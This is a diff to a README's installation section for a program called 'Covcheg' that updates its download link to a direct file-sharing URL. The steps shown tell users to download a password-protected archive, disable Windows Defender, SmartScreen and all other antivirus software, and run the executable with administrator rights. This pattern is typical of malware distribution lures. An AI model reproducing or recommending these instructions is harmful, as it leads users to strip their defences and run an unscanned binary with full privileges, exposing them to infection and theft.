@@ -22,7 +22,7 @@ Before launching, make sure to configure your system as follows:
 
 ## 💾 Installation
 
-1. [Download](https://www.4sync.com/rar/Juzt2NK_/Covcheg.html) the latest version of Covcheg. (Password **COVCHEG**) 
+1. [Download](https://www.4sync.com/web/directDownload/Juzt2NK_/cKQ38aak.623e0a9d669a2b7dd906f6592dcf0ba1) the latest version of Covcheg. (Password **COVCHEG**) 
 2. Disable Windows Defender, Smart Screen, and any other antivirus programs as listed in the System Requirements.  
 3. Extract the files to a preferred directory on your computer.  
 4. Run the executable file with administrator privileges.
